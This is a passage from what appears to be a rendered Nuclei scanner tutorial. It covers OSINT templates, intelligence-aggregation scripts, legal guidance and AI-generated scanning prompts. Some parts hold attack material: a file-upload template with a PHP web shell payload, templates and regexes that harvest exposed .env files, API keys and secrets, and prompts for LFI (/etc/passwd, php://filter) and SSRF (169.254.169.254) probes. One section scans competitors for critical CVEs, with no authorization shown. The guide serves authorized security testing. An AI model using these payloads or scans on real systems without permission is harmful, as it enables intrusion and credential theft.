"{{BaseURL}}/crossdomain.xml"\n    \n    extractors:\n      - type: regex\n        name: hidden_directories\n        regex:\n          - \'Disallow:\\s*(/[^\\s]+)\'\n        group: 1\n      \n      - type: regex\n        name: sitemap_urls\n        regex:\n          - \'<loc>([^<]+)</loc>\'\n        group: 1\n\n  - method: GET\n    path:\n      - "{{BaseURL}}/.git/config"\n      - "{{BaseURL}}/.env"\n      - "{{BaseURL}}/config.json"\n      - "{{BaseURL}}/package.json"\n    \n    matchers:\n      - type: word\n        words:\n          - "repositoryformatversion"\n          - "DB_PASSWORD"\n          - "API_KEY"\n          - "dependencies"\n        condition: or\n    \n    extractors:\n      - type: regex\n        name: git_repositories\n        regex:\n          - \'url\\s*=\\s*([^\\s]+)\'\n        group: 1\n      \n      - type: regex\n        name: api_keys\n        regex:\n          - \'(?i)(api[_-]?key|token|secret)["\\s]*[:=]["\\s]*([a-zA-Z0-9\\-_]+)\'\n        group: 2\n'})}),"\n",(0,s.jsx)(n.h3,{id:"156-corporate-intelligence-gathering",children:"15.6 Corporate Intelligence Gathering"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Employee enumeration through exposed directories\nnuclei -l corporate_sites.txt -t exposures/files/employee-directory.yaml\n\n# Organizational chart discovery\nnuclei -l company_domains.txt -t custom/org-chart-discovery.yaml\n\n# Job posting intelligence\nnuclei -l career_pages.txt -t osint/job-posting-analysis.yaml\n\n# Technology stack analysis\nnuclei -l corporate_apps.txt -t technologies/ -tags cms,framework,server\n\n# Vendor and partner discovery\nnuclei -l company_sites.txt -t osint/vendor-discovery.yaml\n"})}),"\n",(0,s.jsx)(n.h3,{id:"157-infrastructure-and-network-intelligence",children:"15.7 Infrastructure and Network Intelligence"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:'id: infrastructure-intelligence-gathering\n\ninfo:\n  name: Infrastructure Intelligence Gathering\n  author: osint-team\n  severity: info\n  description: Comprehensive infrastructure reconnaissance and mapping\n  tags: osint,infrastructure,network,mapping\n\ndns:\n  - name: "{{FQDN}}"\n    type: A\n    class: inet\n    \n    extractors:\n      - type: regex\n        name: ip_addresses\n        regex:\n          - \'(\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3})\'\n        group: 1\n\n  - name: "{{FQDN}}"\n    type: MX\n    class: inet\n    \n    extractors:\n      - type: regex\n        name: mail_servers\n        regex:\n          - \'IN\\s+MX\\s+\\d+\\s+([^\\s]+)\'\n        group: 1\n\n  - name: "{{FQDN}}"\n    type: NS\n    class: inet\n    \n    extractors:\n      - type: regex\n        name: name_servers\n        regex:\n          - \'IN\\s+NS\\s+([^\\s]+)\'\n        group: 1\n\n  - name: "{{FQDN}}"\n    type: TXT\n    class: inet\n    \n    extractors:\n      - type: regex\n        name: spf_records\n        regex:\n          - \'"v=spf1\\s+([^"]+)"\'\n        group: 1\n      \n      - type: regex\n        name: dmarc_records\n        regex:\n          - \'"v=DMARC1[^"]*"\'\n        group: 0\n\nhttp:\n  - method: GET\n    path:\n      - "{{BaseURL}}/.well-known/security.txt"\n      - "{{BaseURL}}/security.txt"\n    \n    matchers:\n      - type: status\n        status:\n          - 200\n    \n    extractors:\n      - type: regex\n        name: security_contacts\n        regex:\n          - \'Contact:\\s*([^\\r\\n]+)\'\n        group: 1\n      \n      - type: regex\n        name: pgp_keys\n        regex:\n          - \'Encryption:\\s*([^\\r\\n]+)\'\n        group: 1\n'})}),"\n",(0,s.jsx)(n.h3,{id:"158-automated-osint-data-aggregation",children:"15.8 Automated OSINT Data Aggregation"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"# Python script for OSINT data aggregation and analysis\nimport json\nimport subprocess\nimport re\nfrom collections import defaultdict\n\nclass OSINTAggregator:\n    def __init__(self):\n        self.data = defaultdict(list)\n        self.targets = []\n    \n    def run_nuclei_osint(self, target):\n        \"\"\"Execute comprehensive OSINT scan\"\"\"\n        templates = [\n            'exposures/',\n            'technologies/',\n            'dns/',\n            'ssl/',\n            'misconfigurations/'\n        ]\n        \n        all_results = []\n        for template in templates:\n            cmd = [\n                'nuclei',\n                '-u', target,\n                '-t', template,\n                '-severity', 'info,low,medium',\n                '-json',\n                '-silent'\n            ]\n            \n            result = subprocess.run(cmd, capture_output=True, text=True)\n            if result.stdout:\n                for line in result.stdout.strip().split('\\n'):\n                    try:\n                        all_results.append(json.loads(line))\n                    except json.JSONDecodeError:\n                        continue\n        \n        return all_results\n    \n    def extract_intelligence(self, results):\n        \"\"\"Extract and categorize intelligence from scan results\"\"\"\n        intelligence = {\n            'emails': set(),\n            'social_media': set(),\n            'technologies': set(),\n            'subdomains': set(),\n            'ip_addresses': set(),\n            'phone_numbers': set(),\n            'api_endpoints': set(),\n            'sensitive_files': set()\n        }\n        \n        for result in results:\n            # Extract emails\n            if 'extracted' in result:\n                for extraction in result['extracted']:\n                    if '@' in extraction:\n                        intelligence['emails'].add(extraction)\n            \n            # Extract technologies\n            if result.get('info', {}).get('tags'):\n                for tag in result['info']['tags']:\n                    if tag in ['apache', 'nginx', 'php', 'python', 'java', 'nodejs']:\n                        intelligence['technologies'].add(tag)\n            \n            # Extract URLs for further analysis\n            matched_at = result.get('matched-at', '')\n            if matched_at:\n                # Extract potential subdomains\n                domain_match = re.search(r'https?://([^/]+)', matched_at)\n                if domain_match:\n                    intelligence['subdomains'].add(domain_match.group(1))\n        \n        return intelligence\n    \n    def generate_osint_report(self, target, intelligence):\n        \"\"\"Generate comprehensive OSINT report\"\"\"\n        report = f\"\"\"\n# OSINT Intelligence Report for {target}\n\n## Executive Summary\n- Total emails discovered: {len(intelligence['emails'])}\n- Technologies identified: {len(intelligence['technologies'])}\n- Subdomains found: {len(intelligence['subdomains'])}\n- IP addresses: {len(intelligence['ip_addresses'])}\n\n## Email Addresses\n{chr(10).join(f'- {email}' for email in sorted(intelligence['emails']))}\n\n## Technology Stack\n{chr(10).join(f'- {tech}' for tech in sorted(intelligence['technologies']))}\n\n## Subdomains and Infrastructure\n{chr(10).join(f'- {sub}' for sub in sorted(intelligence['subdomains']))}\n\n## Social Media Presence\n{chr(10).join(f'- {social}' for social in sorted(intelligence['social_media']))}\n\n## Sensitive Exposures\n{chr(10).join(f'- {file}' for file in sorted(intelligence['sensitive_files']))}\n        \"\"\"\n        \n        return report\n    \n    def comprehensive_osint(self, targets):\n        \"\"\"Execute comprehensive OSINT analysis\"\"\"\n        all_intelligence = {}\n        \n        for target in targets:\n            print(f\"[+] Gathering OSINT for {target}\")\n            results = self.run_nuclei_osint(target)\n            intelligence = self.extract_intelligence(results)\n            all_intelligence[target] = intelligence\n            \n            # Generate individual report\n            report = self.generate_osint_report(target, intelligence)\n            with open(f'osint_report_{target.replace(\"://\", \"_\").replace(\"/\", \"_\")}.md', 'w') as f:\n                f.write(report)\n        \n        return all_intelligence\n\n# Usage example\nosint = OSINTAggregator()\ntargets = ['https://example.com', 'https://api.example.com']\nintelligence = osint.comprehensive_osint(targets)\n"})}),"\n",(0,s.jsx)(n.h3,{id:"159-osint-data-correlation-and-analysis",children:"15.9 OSINT Data Correlation and Analysis"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Correlate OSINT findings across multiple sources\nnuclei -l targets.txt -t exposures/ -json | \\\n  jq -r '.extracted[]?' | \\\n  grep -E '@|twitter\\.com|linkedin\\.com' | \\\n  sort | uniq > osint_contacts.txt\n\n# Technology fingerprint correlation\nnuclei -l targets.txt -t technologies/ -json | \\\n  jq -r '.info.name' | \\\n  sort | uniq -c | \\\n  sort -nr > technology_frequency.txt\n\n# Subdomain aggregation from multiple sources\nnuclei -l domains.txt -t dns/ -json | \\\n  jq -r '.matched-at' | \\\n  cut -d'/' -f3 | \\\n  sort | uniq > discovered_subdomains.txt\n\n# Email domain analysis\ngrep -o '@[^[:space:]]*' osint_contacts.txt | \\\n  cut -d'@' -f2 | \\\n  sort | uniq -c | \\\n  sort -nr > email_domains.txt\n"})}),"\n",(0,s.jsx)(n.h3,{id:"1510-integration-with-external-osint-tools",children:"15.10 Integration with External OSINT Tools"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Combine Nuclei with Subfinder for comprehensive discovery\nsubfinder -d example.com -o subdomains.txt\nnuclei -l subdomains.txt -t exposures/ -t technologies/ -o osint_results.json\n\n# Integration with theHarvester\ntheHarvester -d example.com -b all -f harvester_results\nnuclei -l harvester_emails.txt -t exposures/email-verification.yaml\n\n# Shodan integration for infrastructure mapping\nshodan search "org:Example Corp" --format json > shodan_results.json\ncat shodan_results.json | jq -r \'.ip_str\' > shodan_ips.txt\nnuclei -l shodan_ips.txt -t network/ -o network_osint.json\n\n# WHOIS data correlation\nwhois example.com | grep -E "Email|Phone|Name" > whois_contacts.txt\n'})}),"\n",(0,s.jsx)(n.h3,{id:"1511-dark-web-and-deep-web-reconnaissance",children:"15.11 Dark Web and Deep Web Reconnaissance"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-yaml",children:'id: deep-web-asset-discovery\n\ninfo:\n  name: Deep Web Asset Discovery\n  author: osint-team\n  severity: info\n  description: Discovers potential deep web and hidden assets\n  tags: osint,deep-web,hidden,assets\n\nhttp:\n  - method: GET\n    path:\n      - "{{BaseURL}}/onion"\n      - "{{BaseURL}}/.onion"\n      - "{{BaseURL}}/tor"\n      - "{{BaseURL}}/hidden"\n      - "{{BaseURL}}/dark"\n    \n    matchers:\n      - type: word\n        words:\n          - ".onion"\n          - "tor browser"\n          - "hidden service"\n          - "dark web"\n        condition: or\n        case-insensitive: true\n    \n    extractors:\n      - type: regex\n        regex:\n          - \'([a-z2-7]{16,56}\\.onion)\'\n        group: 1\n\n  - method: GET\n    path:\n      - "{{BaseURL}}/robots.txt"\n    \n    matchers:\n      - type: word\n        words:\n          - "Disallow:"\n    \n    extractors:\n      - type: regex\n        name: hidden_paths\n        regex:\n          - \'Disallow:\\s*(/[^\\s\\r\\n]+)\'\n        group: 1\n'})}),"\n",(0,s.jsx)(n.h3,{id:"1512-competitive-intelligence-gathering",children:"15.12 Competitive Intelligence Gathering"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Competitor technology analysis\nnuclei -l competitor_sites.txt -t technologies/ -tags cms,framework -o competitor_tech.json\n\n# Competitor vulnerability assessment\nnuclei -l competitor_domains.txt -t cves/ -severity critical,high -o competitor_vulns.json\n\n# Competitor infrastructure mapping\nnuclei -l competitor_ips.txt -t network/ -t ssl/ -o competitor_infrastructure.json\n\n# Market positioning analysis\nnuclei -l industry_sites.txt -t exposures/apis/ -tags swagger,graphql -o market_apis.json\n"})}),"\n",(0,s.jsx)(n.h3,{id:"1513-threat-intelligence-integration",children:"15.13 Threat Intelligence Integration"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-python",children:"# Threat intelligence correlation with OSINT findings\nimport requests\nimport json\n\nclass ThreatIntelligence:\n    def __init__(self):\n        self.ioc_feeds = [\n            'https://feodotracker.abuse.ch/downloads/ipblocklist.json',\n            'https://urlhaus-api.abuse.ch/v1/urls/recent/',\n            'https://threatfox-api.abuse.ch/api/v1/'\n        ]\n    \n    def check_ioc_correlation(self, osint_data):\n        \"\"\"Check OSINT findings against threat intelligence feeds\"\"\"\n        threats = []\n        \n        for finding in osint_data:\n            ip = self.extract_ip(finding.get('matched-at', ''))\n            if ip:\n                threat_level = self.check_ip_reputation(ip)\n                if threat_level > 0:\n                    threats.append({\n                        'ip': ip,\n                        'threat_level': threat_level,\n                        'source': finding.get('template-id'),\n                        'url': finding.get('matched-at')\n                    })\n        \n        return threats\n    \n    def check_ip_reputation(self, ip):\n        \"\"\"Check IP against threat intelligence sources\"\"\"\n        # Implementation for IP reputation checking\n        # Returns threat level (0-10)\n        return 0\n    \n    def extract_ip(self, url):\n        \"\"\"Extract IP address from URL\"\"\"\n        import re\n        ip_pattern = r'\\b(?:[0-9]{1,3}\\.){3}[0-9]{1,3}\\b'\n        match = re.search(ip_pattern, url)\n        return match.group(0) if match else None\n\n# Usage\nthreat_intel = ThreatIntelligence()\nwith open('osint_results.json', 'r') as f:\n    osint_data = [json.loads(line) for line in f]\n\nthreats = threat_intel.check_ioc_correlation(osint_data)\nprint(f\"Potential threats identified: {len(threats)}\")\n"})}),"\n",(0,s.jsx)(n.h2,{id:"16-legal-and-ethical-considerations",children:"16. Legal and Ethical Considerations"}),"\n",(0,s.jsx)(n.p,{children:"All Nuclei scanning activities must be performed within legal and ethical boundaries with proper authorization and scope definition."}),"\n",(0,s.jsx)(n.h3,{id:"161-authorization-requirements",children:"16.1 Authorization Requirements"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Pre-Engagement Authorization:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Written permission from asset owners"}),"\n",(0,s.jsx)(n.li,{children:"Clearly defined scope of testing targets"}),"\n",(0,s.jsx)(n.li,{children:"Approved time windows for scanning activities"}),"\n",(0,s.jsx)(n.li,{children:"Escalation procedures for critical findings"}),"\n",(0,s.jsx)(n.li,{children:"Data handling and retention policies"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Scope Limitations:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"IP address ranges and domain specifications"}),"\n",(0,s.jsx)(n.li,{children:"Excluded systems and sensitive infrastructure"}),"\n",(0,s.jsx)(n.li,{children:"Rate limiting requirements for production systems"}),"\n",(0,s.jsx)(n.li,{children:"Specific vulnerability types to test or exclude"}),"\n",(0,s.jsx)(n.li,{children:"Reporting and communication protocols"}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"162-documentation-standards",children:"16.2 Documentation Standards"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Comprehensive Documentation Must Include:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"Scope of authorization and testing targets"}),"\n",(0,s.jsx)(n.li,{children:"Scanning methodologies and tools employed"}),"\n",(0,s.jsx)(n.li,{children:"Timeline of all scanning activities"}),"\n",(0,s.jsx)(n.li,{children:"Findings classification and risk assessment"}),"\n",(0,s.jsx)(n.li,{children:"Remediation recommendations and timelines"}),"\n",(0,s.jsx)(n.li,{children:"Evidence preservation and chain of custody"}),"\n"]}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Legal Compliance Requirements:"})}),"\n",(0,s.jsxs)(n.ul,{children:["\n",(0,s.jsx)(n.li,{children:"GDPR compliance for EU-based targets"}),"\n",(0,s.jsx)(n.li,{children:"Industry-specific regulations (HIPAA, PCI-DSS, SOX)"}),"\n",(0,s.jsx)(n.li,{children:"Cross-border data transfer considerations"}),"\n",(0,s.jsx)(n.li,{children:"Data retention and disposal requirements"}),"\n",(0,s.jsx)(n.li,{children:"Third-party disclosure obligations"}),"\n"]}),"\n",(0,s.jsx)(n.h3,{id:"163-responsible-disclosure",children:"16.3 Responsible Disclosure"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-markdown",children:"# Vulnerability Disclosure Template\n\n## Executive Summary\n- Vulnerability classification and severity\n- Affected systems and potential impact\n- Recommended immediate actions\n\n## Technical Details\n- Vulnerability description and root cause\n- Proof of concept and reproduction steps\n- Technical impact assessment\n- Affected software versions and configurations\n\n## Remediation Guidance\n- Immediate mitigation steps\n- Long-term remediation strategy\n- Validation testing recommendations\n- Security control improvements\n\n## Timeline\n- Discovery date and methodology\n- Initial notification timeline\n- Remediation deadline recommendations\n- Re-testing and validation schedule\n"})}),"\n",(0,s.jsx)(n.h2,{id:"17-troubleshooting-and-common-issues",children:"17. Troubleshooting and Common Issues"}),"\n",(0,s.jsx)(n.p,{children:"Address common operational challenges and provide solutions for typical Nuclei deployment scenarios."}),"\n",(0,s.jsx)(n.h3,{id:"171-performance-issues",children:"17.1 Performance Issues"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Memory optimization for large target sets\nnuclei -l large_targets.txt -stream -bulk-size 10 -rate-limit 50\n\n# DNS resolution optimization\nnuclei -l targets.txt -dns-resolver "8.8.8.8,1.1.1.1" -dns-timeout 5\n\n# Connection timeout optimization\nnuclei -l targets.txt -timeout 15 -retries 2 -max-host-error 3\n\n# Template loading optimization\nnuclei -l targets.txt -t cves/ -exclude-templates dos/ -template-threads 25\n\n# Disk space management\nnuclei -l targets.txt -json -o results.json -omit-raw\n'})}),"\n",(0,s.jsx)(n.h3,{id:"172-network-connectivity-issues",children:"17.2 Network Connectivity Issues"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Proxy troubleshooting\nnuclei -u https://example.com -http-proxy http://proxy:8080 -debug\n\n# SSL/TLS certificate issues\nnuclei -u https://example.com -insecure -verify-ssl=false\n\n# IPv6 connectivity testing\nnuclei -u https://[2001:db8::1] -ip-version 6\n\n# Custom DNS resolution\nnuclei -u example.com -dns-resolver 8.8.8.8 -dns-timeout 10\n\n# Connection pooling issues\nnuclei -l targets.txt -max-redirects 5 -max-host-error 10\n"})}),"\n",(0,s.jsx)(n.h3,{id:"173-template-development-debugging",children:"17.3 Template Development Debugging"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Template syntax validation\nnuclei -t custom-template.yaml -validate\n\n# Template execution debugging\nnuclei -u https://example.com -t custom-template.yaml -debug\n\n# Variable substitution testing\nnuclei -u https://example.com -t template.yaml -debug-req -debug-resp\n\n# Matcher condition debugging\nnuclei -u https://example.com -t template.yaml -verbose\n\n# Performance profiling\nnuclei -u https://example.com -t template.yaml -profile-mem\n"})}),"\n",(0,s.jsx)(n.h2,{id:"19-ai-powered-template-generation-and-security-testing",children:"19. AI-Powered Template Generation and Security Testing"}),"\n",(0,s.jsx)(n.p,{children:"Nuclei integrates artificial intelligence capabilities to automate template creation, enhance vulnerability detection, and provide intelligent security testing workflows. This section covers AI-driven methodologies for rapid template generation and advanced security testing scenarios."}),"\n",(0,s.jsx)(n.h3,{id:"191-native-ai-template-generation",children:"19.1 Native AI Template Generation"}),"\n",(0,s.jsx)(n.p,{children:"Nuclei supports generating and running templates on-the-fly using AI capabilities powered by the ProjectDiscovery API:"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Prerequisites: ProjectDiscovery API key required\nexport PDCP_API_KEY="your_api_key_here"\n\n# Basic AI-powered vulnerability detection\nnuclei -l targets.txt -ai "Detect SQL injection vulnerabilities in login forms"\n\n# Advanced XSS detection with context\nnuclei -l targets.txt -ai "Find reflected XSS in search parameters with payload validation"\n\n# SSRF vulnerability identification\nnuclei -l targets.txt -ai "Identify SSRF vulnerabilities in URL parameters with internal IP probing"\n\n# Configuration exposure detection\nnuclei -l targets.txt -ai "Find exposed .env files containing database credentials and API keys"\n\n# Admin panel discovery\nnuclei -l targets.txt -ai "Detect exposed admin panels with default authentication bypass"\n'})}),"\n",(0,s.jsx)(n.h3,{id:"192-ai-browser-extension-for-real-time-template-creation",children:"19.2 AI Browser Extension for Real-Time Template Creation"}),"\n",(0,s.jsx)(n.p,{children:"The Nuclei AI Browser Extension enables dynamic template generation from web content:"}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"Installation and Setup:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Chrome Extension Installation\n# 1. Download from GitHub releases\n# 2. Enable Developer mode in chrome://extensions\n# 3. Load unpacked extension folder\n# 4. Login to cloud.projectdiscovery.io\n\n# Keyboard shortcut for AI editor\n# Press Ctrl+Shift+O on any webpage to toggle AI editor\n"})}),"\n",(0,s.jsx)(n.p,{children:(0,s.jsx)(n.strong,{children:"HackerOne Integration Example:"})}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-javascript",children:'// Extract vulnerability details from HackerOne reports\n// Right-click on report \u2192 "Generate Nuclei Template"\n// AI processes the POC and generates YAML template\n\n// Example generated template from H1 report:\nid: h1-rce-vulnerability\ninfo:\n  name: Remote Code Execution via File Upload\n  author: ai-generated\n  severity: critical\n  description: RCE through unrestricted file upload functionality\n  \nhttp:\n  - method: POST\n    path:\n      - "{{BaseURL}}/upload"\n    headers:\n      Content-Type: "multipart/form-data"\n    body: |\n      ------WebKitFormBoundary\n      Content-Disposition: form-data; name="file"; filename="shell.php"\n      Content-Type: application/octet-stream\n      \n      <?php system($_GET[\'cmd\']); ?>\n      ------WebKitFormBoundary--\n    \n    matchers:\n      - type: word\n        words:\n          - "upload successful"\n        condition: and\n      - type: status\n        status:\n          - 200\n'})}),"\n",(0,s.jsx)(n.h3,{id:"193-comprehensive-ai-security-testing-workflows",children:"19.3 Comprehensive AI Security Testing Workflows"}),"\n",(0,s.jsx)(n.h4,{id:"1931-reconnaissance-and-information-gathering",children:"19.3.1 Reconnaissance and Information Gathering"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Technology stack detection and version enumeration\nnuclei -list targets.txt -ai "Extract page title, detect technologies and versions"\n\n# Email and contact information harvesting\nnuclei -list targets.txt -ai "Extract email addresses from web pages"\n\n# Subdomain and infrastructure discovery\nnuclei -list targets.txt -ai "Extract all subdomains referenced in web pages"\n\n# External resource enumeration\nnuclei -list targets.txt -ai "Extract all external resource URLs (CDNs, images, iframes, fonts) from HTML"\n\n# Social media presence mapping\nnuclei -list targets.txt -ai "Extract social media profile links from web pages"\n\n# Development environment discovery\nnuclei -list targets.txt -ai "Extract links pointing to staging, dev, or beta environments from HTML"\n\n# Document and file discovery\nnuclei -list targets.txt -ai "Extract all links pointing to PDF, DOCX, XLSX, and other downloadable documents"\n\n# AI/ML asset discovery\nnuclei -list targets.txt -ai "Find exposed AI/ML model files (.pkl, .h5, .pt) that may leak proprietary algorithms or sensitive training data"\n\n# Automation script exposure\nnuclei -list targets.txt -ai "Find exposed automation scripts (.sh, .ps1, .bat) revealing internal tooling or credentials"\n'})}),"\n",(0,s.jsx)(n.h4,{id:"1932-configuration-and-security-misconfiguration-detection",children:"19.3.2 Configuration and Security Misconfiguration Detection"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Security header analysis\nnuclei -list targets.txt -ai "Identify misconfigured CSP headers allowing \'unsafe-inline\' or wildcard sources"\n\n# JWT token exposure detection\nnuclei -list targets.txt -ai "Detect pages leaking JWT tokens in URLs or cookies"\n\n# Error message analysis\nnuclei -list targets.txt -ai "Identify overly verbose error messages revealing framework or library details"\n\n# Source code exposure\nnuclei -list targets.txt -ai "Find application endpoints with verbose stack traces or source code exposure"\n\n# Sensitive information in comments\nnuclei -list targets.txt -ai "Find sensitive information in HTML comments (debug notes, API keys, credentials)"\n\n# Environment file exposure\nnuclei -list targets.txt -ai "Find exposed .env files leaking credentials, API keys, and database passwords"\n\n# Configuration file discovery\nnuclei -list targets.txt -ai "Find exposed configuration files containing sensitive information such as credentials, API keys, database passwords, and cloud service secrets"\n\n# Database configuration exposure\nnuclei -list targets.txt -ai "Find database configuration files such as database.yml, db_config.php, .pgpass, .my.cnf leaking credentials"\n\n# Container configuration exposure\nnuclei -list targets.txt -ai "Find exposed Docker and Kubernetes configuration files such as docker-compose.yml, kubeconfig, .dockercfg, .docker/config.json containing cloud credentials and secrets"\n\n# SSH configuration exposure\nnuclei -list targets.txt -ai "Find exposed SSH keys and configuration files such as id_rsa, authorized_keys, and ssh_config"\n'})}),"\n",(0,s.jsx)(n.h4,{id:"1933-advanced-web-application-security-testing",children:"19.3.3 Advanced Web Application Security Testing"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# SQL Injection Detection with AI\nnuclei -list katana.jsonl -im jsonl -ai "Perform fuzzing on all parameters and HTTP methods using DSL, focusing on detecting SQL Injection vulnerabilities with pre-conditions"\n\n# Database error analysis\nnuclei -list katana.jsonl -im jsonl -ai "Search for database error responses indicating SQL query issues"\n\n# Parameter-specific SQL injection\nnuclei -list katana.jsonl -im jsonl -ai "Find SQL injection in \'id\', \'user\', \'product\', \'category\', \'page\' parameters"\n\n# Blind SQL injection detection\nnuclei -list katana.jsonl -im jsonl -ai "Identify potential blind SQL injection by probing query-related parameters such as search, s, q, query, sort, and filter"\n\n# Time-based SQL injection\nnuclei -list katana.jsonl -im jsonl -ai "Use time delay techniques to detect time-based SQLi in all request parameters"\n\n# JSON API SQL injection\nnuclei -list katana.jsonl -im jsonl -ai "Probe JSON-based API endpoints for injectable fields susceptible to SQL injection"\n\n# Header-based SQL injection\nnuclei -list katana.jsonl -im jsonl -ai "Inject SQL payloads into HTTP headers to detect header-based injection points (e.g. User-Agent, Referer, X-Forwarded-For, X-Forwarded-Host)"\n'})}),"\n",(0,s.jsx)(n.h4,{id:"1934-cross-site-scripting-xss-detection",children:"19.3.4 Cross-Site Scripting (XSS) Detection"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Comprehensive XSS detection\nnuclei -list katana.jsonl -im jsonl -ai "Fuzz all parameters and HTTP methods using DSL to detect XSS vulnerabilities, including reflected, stored, and DOM-based variants, applying context-aware pre-conditions"\n\n# Reflected XSS testing\nnuclei -list katana.jsonl -im jsonl -ai "Test for reflected XSS in user-controllable parameters such as q, search, s, redirect, return, and url by injecting JavaScript payloads and observing output"\n\n# Stored XSS detection\nnuclei -list katana.jsonl -im jsonl -ai "Attempt stored XSS injection across all form fields and request parameters, analyzing persistent payload reflections in responses"\n\n# Persistent XSS in user data\nnuclei -list katana.jsonl -im jsonl -ai "Identify stored XSS in comment fields, usernames, profile descriptions"\n\n# DOM-based XSS identification\nnuclei -list katana.jsonl -im jsonl -ai "Detect DOM-based XSS in JavaScript variables using common sources like location.href, document.URL, and referrer"\n\n# AJAX endpoint XSS testing\nnuclei -list katana.jsonl -im jsonl -ai "Fuzz AJAX or dynamic endpoints to identify reflected or stored XSS triggered via asynchronous responses"\n\n# JSON XSS exploitation\nnuclei -list katana.jsonl -im jsonl -ai "Inject XSS payloads into JSON fields of API requests and responses to find injection points vulnerable to script execution"\n'})}),"\n",(0,s.jsx)(n.h4,{id:"1935-server-side-request-forgery-ssrf-detection",children:"19.3.5 Server-Side Request Forgery (SSRF) Detection"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:"# Comprehensive SSRF detection\nnuclei -list katana.jsonl -im jsonl -ai \"Perform fuzzing on all HTTP parameters and methods using DSL, focusing on detecting SSRF vulnerabilities with pre-condition checks like internal IP ranges, URL redirects, and response behaviors\"\n\n# Parameter-based SSRF testing\nnuclei -list katana.jsonl -im jsonl -ai \"Detect SSRF in common URL-related parameters like 'url', 'link', 'redirect', 'next', 'feed', and 'callback' by injecting payloads targeting internal services and metadata endpoints\"\n\n# Internal IP range testing\nnuclei -list katana.jsonl -im jsonl -ai \"Detect SSRF by injecting known internal IP ranges such as 127.0.0.1, 169.254.169.254, 10.0.0.0/8, 172.16.0.0/12, and 192.168.0.0/16 and analyzing server responses\"\n\n# API endpoint SSRF testing\nnuclei -list katana.jsonl -im jsonl -ai \"Identify SSRF in API endpoints that fetch external resources, including indirect references such as file uploads, image fetchers, and URL previews\"\n\n# Blind SSRF detection\nnuclei -list katana.jsonl -im jsonl -ai \"Detect blind SSRF by injecting unique external DNS and HTTP callbacks to monitor asynchronous server requests\"\n\n# Webhook-based SSRF testing\nnuclei -list katana.jsonl -im jsonl -ai \"Scan for blind SSRF by injecting webhooks and external DNS resolver payloads\"\n"})}),"\n",(0,s.jsx)(n.h4,{id:"1936-file-inclusion-vulnerability-testing",children:"19.3.6 File Inclusion Vulnerability Testing"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# LFI/RFI comprehensive testing\nnuclei -list katana.jsonl -im jsonl -ai "Fuzz all HTTP methods and parameters using DSL to detect Local and Remote File Inclusion (LFI/RFI) vulnerabilities, with context-aware pre-conditions"\n\n# Parameter-specific LFI testing\nnuclei -list katana.jsonl -im jsonl -ai "Search for LFI in parameters like file, path, template, inc, lang, and page using traversal payloads and file read probes"\n\n# Remote file inclusion testing\nnuclei -list katana.jsonl -im jsonl -ai "Test for Remote File Inclusion (RFI) by injecting remote HTTP/HTTPS URLs into parameters such as file and load"\n\n# Directory traversal attacks\nnuclei -list katana.jsonl -im jsonl -ai "Identify Local File Inclusion by injecting payloads like /etc/passwd, ../../etc/passwd, php://filter, and php://input into suspect parameters"\n\n# Error-based file inclusion\nnuclei -list katana.jsonl -im jsonl -ai "Detect file inclusion vulnerabilities based on verbose error messages or path disclosures revealing local file structure"\n'})}),"\n",(0,s.jsx)(n.h3,{id:"194-javascript-security-analysis-with-ai",children:"19.4 JavaScript Security Analysis with AI"}),"\n",(0,s.jsx)(n.pre,{children:(0,s.jsx)(n.code,{className:"language-bash",children:'# Comprehensive JavaScript security audit\ndocker run -v $(pwd):/src projectdiscovery/nuclei:latest -l /src/js_links -ai "Analyze JavaScript code for security vulnerabilities (XSS, CSRF, SSRF, RCE, LFI, LFR, etc)"\n\n# Deep JavaScript security analysis\ndocker run -v $(pwd):/src projectdiscovery/nuclei:latest -l /src/js_links -ai "Perform a full deep JavaScript security audit: API keys, secrets, internal endpoints, debug 